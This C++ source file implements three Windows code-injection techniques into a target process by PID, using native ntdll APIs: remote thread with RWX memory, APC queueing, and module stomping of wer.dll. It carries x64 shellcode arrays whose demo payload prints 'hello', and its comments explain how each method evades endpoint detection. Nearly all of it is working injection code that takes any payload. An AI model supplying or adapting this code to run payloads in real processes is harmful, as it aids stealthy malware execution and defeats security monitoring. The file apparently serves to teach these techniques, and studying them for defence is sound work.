// NativeApiCodeInjection.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <Windows.h>
#include "NativeApi.h"
#include <iostream>

typedef
VOID
(WINAPI* pOutputDebugStringA)(
    _In_ LPCSTR lpOutputString
);

//
// An example function that will be executed when using
// NtCreateThreadEx. It expects a function pointer to 
// OutputDebugStringA to be passed as the thread 
// parameter. It will output the string 'hello' which 
// can be observed by running SysInternals' DebugView 
// application.
//
DWORD
WINAPI
InjectedRoutine(
    _In_ LPVOID lpThreadParameter)
{
    CHAR szDebugStr[] = { 'h','e','l','l','o',0 };

    ((pOutputDebugStringA)lpThreadParameter)(szDebugStr);

    return 0;
}
//
// An example function that will be executed when using
// NtQueueApcThread. It expects a function pointer to
// OutputDebugStringA to be passed as the first system
// argument parameter. It will output the string 'hello'
// which can be observed by running SysInternals'
// DebugView application.
//
VOID
WINAPI
InjectedApcRoutine(
    _In_opt_ LPVOID lpSystemArgument1,
    _In_opt_ LPVOID lpSystemArgument2,
    _In_opt_ LPVOID lpSystemArgument3)
{
    CHAR szDebugStr[] = { 'h','e','l','l','o',0 };

    ((pOutputDebugStringA)lpSystemArgument1)(szDebugStr);
}
//
// Bytecode for InjectedRoutine
//
CHAR code[] = 
"\x48\x89\x4C\x24\x08\x48\x83\xEC\x38\xC6\x44\x24\x20\x68\xC6\x44"
"\x24\x21\x65\xC6\x44\x24\x22\x6C\xC6\x44\x24\x23\x6C\xC6\x44\x24"
"\x24\x6F\xC6\x44\x24\x25\x00\x48\x8D\x4C\x24\x20\xFF\x54\x24\x40"
"\x33\xC0\x48\x83\xC4\x38\xC3\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC";
//
// Bytecode for InjectedApcRoutine
//
CHAR apcCode[] = 
"\x4C\x89\x44\x24\x18\x48\x89\x54\x24\x10\x48\x89\x4C\x24\x08\x48"
"\x83\xEC\x38\xC6\x44\x24\x20\x68\xC6\x44\x24\x21\x65\xC6\x44\x24"
"\x22\x6C\xC6\x44\x24\x23\x6C\xC6\x44\x24\x24\x6F\xC6\x44\x24\x25"
"\x00\x48\x8D\x4C\x24\x20\xFF\x54\x24\x40\x48\x83\xC4\x38\xC3\xCC";

//
// InjectCodeViaRemoteThread demonstrates the use of the following native APIs:
//
// NtOpenProcess
// NtAllocateVirtualMemory
// NtWriteVirtualMemory
// NtCreateThreadEx
// NtClose
//
// This is the classic code injection technique that involves simply
// allocating RWX memory in the target process and then creating a 
// new thread in the process to execute the code. It is trivially
// detected and generally should be avoided for both the reason that
// a new thread is created which can be monitored from the kernel, 
// as well as the fact memory is allocated in the process and then
// executed in a region that is not backed by the process image.
//
NTSTATUS
WINAPI
InjectCodeViaRemoteThread(
    _In_ HMODULE NtdllBase, 
    _In_ ULONG Pid, 
    _In_ PVOID Code, 
    _In_ SIZE_T CodeSize)
{
    NTSTATUS status         = STATUS_UNSUCCESSFUL;
    HANDLE hProcess         = NULL;
    HANDLE hRemoteThread    = NULL;
    OBJECT_ATTRIBUTES oa    = { 0 };
    CLIENT_ID cid           = { 0 };
    PVOID pRemoteCode       = NULL;
    SIZE_T bytesWritten     = 0;

    if (NtdllBase == NULL || Code == NULL)
        return status;

    //
    // Create all the required function pointers to the native apis we will use
    //
    pNtOpenProcess NtOpenProcess = (pNtOpenProcess)GetProcAddress(NtdllBase, "NtOpenProcess");
    pNtAllocateVirtualMemory NtAllocateVirtualMemory = (pNtAllocateVirtualMemory)GetProcAddress(NtdllBase, "NtAllocateVirtualMemory");
    pNtWriteVirtualMemory NtWriteVirtualMemory = (pNtWriteVirtualMemory)GetProcAddress(NtdllBase, "NtWriteVirtualMemory");
    pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(NtdllBase, "NtCreateThreadEx");
    pNtClose NtClose = (pNtClose)GetProcAddress(NtdllBase, "NtClose");
    pOutputDebugStringA OutputDebugStringAPtr = (pOutputDebugStringA)GetProcAddress(GetModuleHandle(L"kernel32"), "OutputDebugStringA");

    if (NtOpenProcess == NULL || NtAllocateVirtualMemory == NULL ||
        NtWriteVirtualMemory == NULL || NtCreateThreadEx == NULL ||
        NtClose == NULL || OutputDebugStringAPtr == NULL)
        return status;

    //
    // NtOpenProcess requires a pointer to an OBJECT_ATTRIBUTES structure
    // and a CLIENT_ID structure. In this case it uses the UniqueProcess
    // field in the CLIENT_ID structure which is actually just the numeric
    // process id value typecast to a HANDLE
    //
    InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);
#pragma warning(disable:4312) // We can ignore warning for type cast to value of larger size
    cid.UniqueProcess = (HANDLE)Pid;
    status = NtOpenProcess(
        &hProcess, 
        PROCESS_ALL_ACCESS, 
        &oa, 
        &cid
    );
    if (NT_SUCCESS(status)) {
        //
        // Allocate memory in the target process for our injected code
        //
        status = NtAllocateVirtualMemory(
            hProcess, 
            &pRemoteCode, 
            0, 
            &CodeSize, 
            MEM_COMMIT | MEM_RESERVE, 
            PAGE_EXECUTE_READWRITE
        );
        if (NT_SUCCESS(status)) {
            //
            // Write the injected code to the previously allocated memory
            //
            status = NtWriteVirtualMemory(
                hProcess, 
                pRemoteCode, 
                Code, 
                CodeSize, 
                &bytesWritten
            );
            if (NT_SUCCESS(status)) {
                //
                // Create a new thread in the target process that executes our
                // injected code
                //
                status = NtCreateThreadEx(
                    &hRemoteThread,
                    THREAD_ALL_ACCESS,
                    &oa,
                    hProcess,
                    pRemoteCode,
                    (PVOID)OutputDebugStringAPtr, // pass OutputDebugStringA pointer as argument
                    0,
                    0,
                    DEFAULT_THREAD_STACK_SIZE,
                    MAX_THREAD_STACK_SIZE,
                    NULL
                );
                if (NT_SUCCESS(status)) {
                    NtClose(hRemoteThread);
                }
            }
        }
        NtClose(hProcess);
    }

    return status;
}

//
// InjectCodeViaApc demonstrates the use of the following native APIs:
//
// NtAllocateVirtualMemory
// NtWriteVirtualMemory
// NtFreeVirtualMemory
// NtOpenProcess
// NtOpenThread
// NtQuerySystemInformation
// NtQueueApcThread
// NtClose
//
// This is a fairly popular code injection technique for the reason that 
// it doesn't require creation of a new thread in the target process.
// Instead, an existing thread is targeted in the desired process that 
// is in an alertable wait state. When a candidate thread is found in 
// this state, an asynchronous procedure call is queued to that thread
// and it ends up executing the injected code. The original benefit of
// this technique was that since endpoint security software would register
// thread creation callbacks in the kernel to allow them to observe new
// threads being created, this would evade that method of detection. It
// is still an excellent choice assuming that a security vendor does not
// have access to the Microsoft-Windows-Threat-Intelligence ETW provider
// which can provide coverage of this type of injection.
//
NTSTATUS
WINAPI
InjectCodeViaApc(
    _In_ HMODULE NtdllBase,
    _In_ ULONG Pid,
    _In_ PVOID Code,
    _In_ SIZE_T CodeSize)
{
    NTSTATUS status                                     = STATUS_UNSUCCESSFUL;
    HANDLE hProcess                                     = NULL;
    HANDLE hThread                                      = NULL;
    OBJECT_ATTRIBUTES oa                                = { 0 };
    CLIENT_ID pcid                                      = { 0 };
    CLIENT_ID tcid                                      = { 0 };
    PVOID pRemoteCode                                   = NULL;
    SIZE_T bytesWritten                                 = 0;
    PSYSTEM_PROCESS_INFORMATION pSystemProcessInfo      = NULL;
    PSYSTEM_PROCESS_INFORMATION pSystemProcessInfoBase  = NULL;
    SIZE_T systemProcessTableSize                       = 1024 * 1024;
    PPS_APC_ROUTINE pApcRoutine                         = NULL;

    if (NtdllBase == NULL || Code == NULL)
        return status;

    //
    // Create all the required function pointers to the native apis we will use
    //
    pNtAllocateVirtualMemory NtAllocateVirtualMemory = (pNtAllocateVirtualMemory)GetProcAddress(NtdllBase, "NtAllocateVirtualMemory");
    pNtWriteVirtualMemory NtWriteVirtualMemory = (pNtWriteVirtualMemory)GetProcAddress(NtdllBase, "NtWriteVirtualMemory");
    pNtFreeVirtualMemory NtFreeVirtualMemory = (pNtFreeVirtualMemory)GetProcAddress(NtdllBase, "NtFreeVirtualMemory");
    pNtOpenProcess NtOpenProcess = (pNtOpenProcess)GetProcAddress(NtdllBase, "NtOpenProcess");
    pNtOpenThread NtOpenThread = (pNtOpenThread)GetProcAddress(NtdllBase, "NtOpenThread");
    pNtQuerySystemInformation NtQuerySystemInformation = (pNtQuerySystemInformation)GetProcAddress(NtdllBase, "NtQuerySystemInformation");
    pNtQueueApcThread NtQueueApcThread = (pNtQueueApcThread)GetProcAddress(NtdllBase, "NtQueueApcThread");
    pNtClose NtClose = (pNtClose)GetProcAddress(NtdllBase, "NtClose");
    pOutputDebugStringA OutputDebugStringAPtr = (pOutputDebugStringA)GetProcAddress(GetModuleHandle(L"kernel32"), "OutputDebugStringA");

    if (NtAllocateVirtualMemory == NULL || NtWriteVirtualMemory == NULL ||
        NtFreeVirtualMemory == NULL || NtOpenProcess == NULL ||
        NtOpenThread == NULL || NtQuerySystemInformation == NULL ||
        NtQueueApcThread == NULL || NtClose == NULL || OutputDebugStringAPtr == NULL)
        return status;

    status = NtAllocateVirtualMemory(
        GetCurrentProcess(), 
        (PVOID *)&pSystemProcessInfo, 
        0, 
        &systemProcessTableSize, 
        MEM_COMMIT | MEM_RESERVE, 
        PAGE_READWRITE
    );
    if (NT_SUCCESS(status)) {
        pSystemProcessInfoBase = pSystemProcessInfo;
        //
        // Get a list of the system processes and their associated threads
        //
        status = NtQuerySystemInformation(
            SystemProcessInformation, 
            pSystemProcessInfo, 
            1024 * 1024, 
            NULL
        );
        if (NT_SUCCESS(status)) {
            //
            // Find the process we are going to queue the apc to
            //
            status = STATUS_NOT_FOUND;
            for (;;) {
                if (pSystemProcessInfo->UniqueProcessId == (HANDLE)Pid) {
                    status = STATUS_SUCCESS;
                    break;
                }
                else if (pSystemProcessInfo->NextEntryOffset)
                    pSystemProcessInfo = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)pSystemProcessInfo + pSystemProcessInfo->NextEntryOffset);
                else
                    break;
            }
            if (NT_SUCCESS(status)) {
                status = STATUS_NOT_FOUND;
                for (ULONG i = 0; i < pSystemProcessInfo->NumberOfThreads; i++) {
                    //
                    // If the target thread is in an alertable wait state, use it
                    //
                    if (pSystemProcessInfo->Threads[i].ThreadState == 5 && pSystemProcessInfo->Threads[i].WaitReason == WrQueue) {
                        status = STATUS_SUCCESS;
                        tcid.UniqueThread = pSystemProcessInfo->Threads[i].ClientId.UniqueThread;
                        tcid.UniqueProcess = pSystemProcessInfo->Threads[i].ClientId.UniqueProcess;
                        break;
                    }
                }
                if (NT_SUCCESS(status)) {
                    //
                    // Open the target process
                    //
                    InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);
                    pcid.UniqueProcess = (HANDLE)Pid;
                    status = NtOpenProcess(
                        &hProcess,
                        PROCESS_ALL_ACCESS,
                        &oa,
                        &pcid
                    );
                    if (NT_SUCCESS(status)) {
                        //
                        // Allocate memory for the APC routine and write it to the target address space
                        //
                        status = NtAllocateVirtualMemory(
                            hProcess, 
                            (PVOID *)&pApcRoutine, 
                            0, 
                            &CodeSize, 
                            MEM_COMMIT | MEM_RESERVE, 
                            PAGE_EXECUTE_READWRITE
                        );
                        if (NT_SUCCESS(status)) {
                            status = NtWriteVirtualMemory(
                                hProcess, 
                                (PVOID)pApcRoutine, 
                                Code, 
                                CodeSize, 
                                &bytesWritten
                            );
                            if (NT_SUCCESS(status)) {
                                //
                                // Open the alertable thread we found
                                //
                                status = NtOpenThread(
                                    &hThread, 
                                    THREAD_ALL_ACCESS, 
                                    &oa, 
                                    &tcid
                                );
                                if (NT_SUCCESS(status)) {
                                    //
                                    // Queue an APC to our alertable thread
                                    //
                                    status = NtQueueApcThread(
                                        hThread, 
                                        pApcRoutine, 
                                        (PVOID)OutputDebugStringAPtr, 
                                        NULL, 
                                        NULL
                                    );
                                    if (NT_SUCCESS(status))
                                        NtClose(hThread);
                                }
                            }
                        }
                        NtClose(hProcess);
                    }
                }
            }
        }
        NtFreeVirtualMemory(
            GetCurrentProcess(), 
            (PVOID *)&pSystemProcessInfoBase, 
            0, 
            MEM_RELEASE
        );
    }

    return status;
}

//
// InjectCodeViaModuleStomping demonstrates the use of the following native APIs:
// 
// NtQueryVirtualMemory
// NtAllocateVirtualMemory
// NtProtectVirtualMemory
// NtWriteVirtualMemory
// NtReadVirtualMemory
// NtOpenProcess
// NtCreateThreadEx
// NtQueryInformationProcess
// NtClose
// 
// This is another popular code injection technique that involves forcing the 
// target process to load a benign dll and then hijacking the loaded module's 
// entry point by replacing it with the injected code. A new thread is then 
// created to execute the code. The reason this approach is popular is that 
// you can get around having to allocate memory in the target process in a 
// region that is not backed by an image. In this case, since the Windows 
// loader loads a dll, it appears as though any code that is executing 
// actually belongs to the dll. While using a new thread to execute the code 
// is not preferable, it is done here for demonstration purposes. A better 
// approach might be to queue an APC instead. 
//
NTSTATUS
WINAPI
InjectCodeViaModuleStomping(
    _In_ HMODULE NtdllBase,
    _In_ ULONG Pid,
    _In_ PVOID Code,
    _In_ SIZE_T CodeSize)
{
    NTSTATUS status                             = STATUS_UNSUCCESSFUL;
    HANDLE hProcess                             = NULL;
    OBJECT_ATTRIBUTES oa                        = { 0 };
    CLIENT_ID cid                               = { 0 };
    WCHAR wszModuleName[]                       = L"C:\\Windows\\System32\\wer.dll";
    SIZE_T moduleNameSize                       = sizeof(wszModuleName);
    PVOID pModuleName                           = NULL;
    PVOID pStartAddress                         = NULL;
    HANDLE hThread                              = NULL;
    PROCESS_BASIC_INFORMATION procBasicInfo     = { 0 };
    PPEB pProcPEB                               = NULL;
    PEB_LDR_DATA pebLdr                         = { 0 };
    LDR_DATA_TABLE_ENTRY dataTblEntry           = { 0 };
    WCHAR wszDllName[MAX_PATH]                  = { 0 };
    PVOID pWerImageBase                         = NULL;
    PIMAGE_DOS_HEADER pWerDosHeader             = NULL;
    PIMAGE_NT_HEADERS pWerNtHeader              = NULL;
    PVOID pWerAddressOfEntry                    = NULL;
    ULONG entryProtect                          = 0;
    SIZE_T pageSize                             = 0x1000;
    MEMORY_BASIC_INFORMATION mbi                = { 0 };

    if (NtdllBase == NULL || Code == NULL)
        return status;

    //
    // Create all the required function pointers to the native apis we will use
    //
    pNtQueryVirtualMemory NtQueryVirtualMemory = (pNtQueryVirtualMemory)GetProcAddress(NtdllBase, "NtQueryVirtualMemory");
    pNtAllocateVirtualMemory NtAllocateVirtualMemory = (pNtAllocateVirtualMemory)GetProcAddress(NtdllBase, "NtAllocateVirtualMemory");
    pNtProtectVirtualMemory NtProtectVirtualMemory = (pNtProtectVirtualMemory)GetProcAddress(NtdllBase, "NtProtectVirtualMemory");
    pNtWriteVirtualMemory NtWriteVirtualMemory = (pNtWriteVirtualMemory)GetProcAddress(NtdllBase, "NtWriteVirtualMemory");
    pNtReadVirtualMemory NtReadVirtualMemory = (pNtReadVirtualMemory)GetProcAddress(NtdllBase, "NtReadVirtualMemory");
    pNtOpenProcess NtOpenProcess = (pNtOpenProcess)GetProcAddress(NtdllBase, "NtOpenProcess");
    pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(NtdllBase, "NtCreateThreadEx");
    pNtQueryInformationProcess NtQueryInformationProcess = (pNtQueryInformationProcess)GetProcAddress(NtdllBase, "NtQueryInformationProcess");
    pNtClose NtClose = (pNtClose)GetProcAddress(NtdllBase, "NtClose");
    pNtWaitForSingleObject NtWaitForSingleObject = (pNtWaitForSingleObject)GetProcAddress(NtdllBase, "NtWaitForSingleObject");
    pOutputDebugStringA OutputDebugStringAPtr = (pOutputDebugStringA)GetProcAddress(GetModuleHandle(L"kernel32"), "OutputDebugStringA");

    if (NtQueryVirtualMemory == NULL || NtAllocateVirtualMemory == NULL ||
        NtProtectVirtualMemory == NULL || NtWriteVirtualMemory == NULL ||
        NtReadVirtualMemory == NULL || NtOpenProcess == NULL ||
        NtCreateThreadEx == NULL || NtQueryInformationProcess == NULL ||
        NtClose == NULL || NtWaitForSingleObject == NULL ||
        OutputDebugStringAPtr == NULL)
        return status;

    InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);
    cid.UniqueProcess = (HANDLE)Pid;
    //
    // Open the requested process
    //
    status = NtOpenProcess(
        &hProcess, 
        PROCESS_ALL_ACCESS, 
        &oa, 
        &cid
    );
    if (NT_SUCCESS(status)) {
        //
        // Allocate memory for the module name we will forcefully load
        //
        status = NtAllocateVirtualMemory(
            hProcess, 
            &pModuleName, 
            0, 
            &moduleNameSize, 
            MEM_COMMIT, 
            PAGE_READWRITE
        );
        if (NT_SUCCESS(status)) {
            //
            // Write the module name to the target process
            //
            status = NtWriteVirtualMemory(
                hProcess, 
                pModuleName, 
                (PVOID)L"C:\\Windows\\System32\\wer.dll",
                moduleNameSize, 
                NULL
            );
            if (NT_SUCCESS(status)) {
                //
                // Force the process to execute LoadLibraryW in kernel32 using the
                // module name we wrote to the process as its argument
                //
                pStartAddress = GetProcAddress(GetModuleHandle(L"kernel32"), "LoadLibraryW");
                status = NtCreateThreadEx(
                    &hThread, 
                    THREAD_ALL_ACCESS, 
                    &oa, 
                    hProcess, 
                    pStartAddress, // LoadLibraryW
                    pModuleName, // C:\Windows\System32\wer.dll
                    0, 
                    0, 
                    DEFAULT_THREAD_STACK_SIZE, 
                    MAX_THREAD_STACK_SIZE, 
                    NULL
                );
                if (NT_SUCCESS(status)) {
                    //
                    // Wait for the library to be loaded
                    //
                    NtWaitForSingleObject(
                        hThread, 
                        FALSE, 
                        NULL // Infinite wait
                    );
                    //
                    // We now need to enumerate all the loaded modules in the target process
                    // and find our newly loaded wer.dll to obtain its entry point address.
                    // The following is one of the more tedious aspects of having to use
                    // the native API since we have to manully walk the loaded modules list 
                    //
                    NtClose(hThread);
                    status = NtQueryInformationProcess(
                        hProcess, 
                        ProcessBasicInformation, 
                        &procBasicInfo, 
                        sizeof(procBasicInfo), 
                        NULL
                    );
                    if (NT_SUCCESS(status)) {
                        //
                        // Allocate memory to copy the target process' PEB
                        //
                        pProcPEB = (PPEB)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PEB));
                        status = pProcPEB != NULL ? STATUS_SUCCESS : STATUS_NO_MEMORY;
                        if (NT_SUCCESS(status)) {
                            status = NtReadVirtualMemory(
                                hProcess, 
                                procBasicInfo.PebBaseAddress, 
                                pProcPEB, 
                                sizeof(PEB), 
                                NULL
                            );
                            if (NT_SUCCESS(status)) {
                                //
                                // Copy the target process' PEB_LDR_DATA structure so we 
                                // can access the InLoadOrderModuleList
                                //
                                status = NtReadVirtualMemory(
                                    hProcess, 
                                    pProcPEB->Ldr, 
                                    &pebLdr, 
                                    sizeof(pebLdr), 
                                    NULL
                                );
                                if (NT_SUCCESS(status)) {
                                    LIST_ENTRY* pPebLdrListHead = pebLdr.InLoadOrderModuleList.Flink;
                                    LIST_ENTRY* pPebLdrCurrent = pebLdr.InLoadOrderModuleList.Flink;
                                    BOOL found = FALSE;
                                    do {
                                        //
                                        // Walk the list one by one reading each LDR_DATA_TABLE_ENTRY
                                        //
                                        status = NtReadVirtualMemory(
                                            hProcess, 
                                            pPebLdrCurrent, 
                                            &dataTblEntry, 
                                            sizeof(dataTblEntry), 
                                            NULL
                                        );
                                        pPebLdrCurrent = dataTblEntry.InLoadOrderLinks.Flink;
                                        if (NT_SUCCESS(status)) {
                                            if (dataTblEntry.BaseDllName.Length > 0) {
                                                //
                                                // Copy the current modules DllName to compare it
                                                //
                                                status = NtReadVirtualMemory(
                                                    hProcess, 
                                                    dataTblEntry.BaseDllName.Buffer, 
                                                    wszDllName, 
                                                    dataTblEntry.BaseDllName.MaximumLength, 
                                                    NULL
                                                );
                                                if (NT_SUCCESS(status)) {
                                                    // 
                                                    // We are done once we find our loaded module
                                                    //
                                                    if (wcscmp(wszDllName, L"wer.dll") == 0) {
                                                        found = TRUE;
                                                        break;
                                                    }
                                                }
                                            }
                                        }
                                    } while (pPebLdrCurrent != pPebLdrListHead);
                                    status = found ? STATUS_SUCCESS : STATUS_NOT_FOUND;
                                }
                            }
                            HeapFree(GetProcessHeap(), 0, pProcPEB);
                        }
                        if (NT_SUCCESS(status)) {
                            //
                            // Once we've found wer.dll, we will read a page of memory from the DllBase
                            // so we can parse the PE header to find the address of entry point
                            //
                            pWerImageBase = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, pageSize);
                            status = pWerImageBase != NULL ? STATUS_SUCCESS : STATUS_NO_MEMORY;
                            if (NT_SUCCESS(status)) {
                                status = NtReadVirtualMemory(
                                    hProcess, 
                                    dataTblEntry.DllBase, 
                                    pWerImageBase, 
                                    pageSize, 
                                    NULL
                                );
                                if (NT_SUCCESS(status)) {
                                    pWerDosHeader = (PIMAGE_DOS_HEADER)pWerImageBase;
                                    pWerNtHeader = (PIMAGE_NT_HEADERS)((ULONG_PTR)pWerImageBase + pWerDosHeader->e_lfanew);
                                    pWerAddressOfEntry = (PVOID)((ULONG_PTR)dataTblEntry.DllBase + pWerNtHeader->OptionalHeader.AddressOfEntryPoint);
                                    //
                                    // Now that we have the address of entry point, we need to change the protection
                                    // level on the memory region where it is located since it will be set to
                                    // PAGE_EXECUTE_READ and we need to write our payload there
                                    //
                                    status = NtQueryVirtualMemory(
                                        hProcess, 
                                        pWerAddressOfEntry, 
                                        MemoryBasicInformation, 
                                        &mbi, 
                                        sizeof(mbi), 
                                        NULL
                                    );
                                    if (NT_SUCCESS(status)) {
                                        status = NtProtectVirtualMemory(
                                            hProcess,
                                            &mbi.BaseAddress,
                                            &mbi.RegionSize,
                                            PAGE_EXECUTE_READWRITE,
                                            &entryProtect
                                        );
                                        if (NT_SUCCESS(status)) {
                                            //
                                            // Overwrite the original code with our own code
                                            //
                                            status = NtWriteVirtualMemory(
                                                hProcess,
                                                pWerAddressOfEntry,
                                                Code,
                                                CodeSize,
                                                NULL
                                            );
                                            if (NT_SUCCESS(status)) {
                                                //
                                                // Restore the original memory protection
                                                //
                                                status = NtProtectVirtualMemory(
                                                    hProcess,
                                                    &mbi.BaseAddress,
                                                    &mbi.RegionSize,
                                                    entryProtect,
                                                    &entryProtect
                                                );
                                                if (NT_SUCCESS(status)) {
                                                    //
                                                    // Execute the newly injected code
                                                    //
                                                    status = NtCreateThreadEx(
                                                        &hThread,
                                                        THREAD_ALL_ACCESS,
                                                        &oa,
                                                        hProcess,
                                                        pWerAddressOfEntry,
                                                        OutputDebugStringAPtr,
                                                        0,
                                                        0,
                                                        DEFAULT_THREAD_STACK_SIZE,
                                                        MAX_THREAD_STACK_SIZE,
                                                        NULL
                                                    );
                                                    if (NT_SUCCESS(status))
                                                        NtClose(hThread);
                                                }
                                            }
                                        }
                                    }
                                }
                                HeapFree(GetProcessHeap(), 0, pWerImageBase);
                            }
                        }
                    }
                }
            }
        }
        NtClose(hProcess);
    }
    
    return status;
}

int main(int argc, char *argv[])
{
    if (argc < 2) {
        printf("Usage: %s <pid>\n", argv[0]);
        return 0;
    }
#ifdef _WIN64
    HMODULE hNtdll = GetModuleHandle(L"ntdll");
    if (hNtdll != NULL) {
        NTSTATUS status = InjectCodeViaModuleStomping(hNtdll, (ULONG)atoi(argv[1]), code, sizeof(code));
        if (NT_SUCCESS(status))
            printf("[+] Successfully injected code via module stomping\n");
        else
            printf("[-] Failed module stomping code injection with error code 0x%X\n", status);
        status = InjectCodeViaRemoteThread(
            hNtdll, 
            (ULONG)atoi(argv[1]), 
            code, 
            sizeof(code)
        );
        if (NT_SUCCESS(status))
            printf("[+] Successfully injected code via remote thread\n");
        else
            printf("[-] Failed remote thread code injection with error code 0x%X\n", status);
        status = InjectCodeViaApc(
            hNtdll, 
            (ULONG)atoi(argv[1]), 
            apcCode, 
            sizeof(apcCode)
        );
        if (NT_SUCCESS(status))
            printf("[+] Successfully injected code via APC\n");
        else
            printf("[-] Failed APC code injection with error code 0x%X\n", status);
    }
#else
    printf("[-] Not implemented for 32 bit. Rebuild project as x64\n");
#endif

    return 0;
}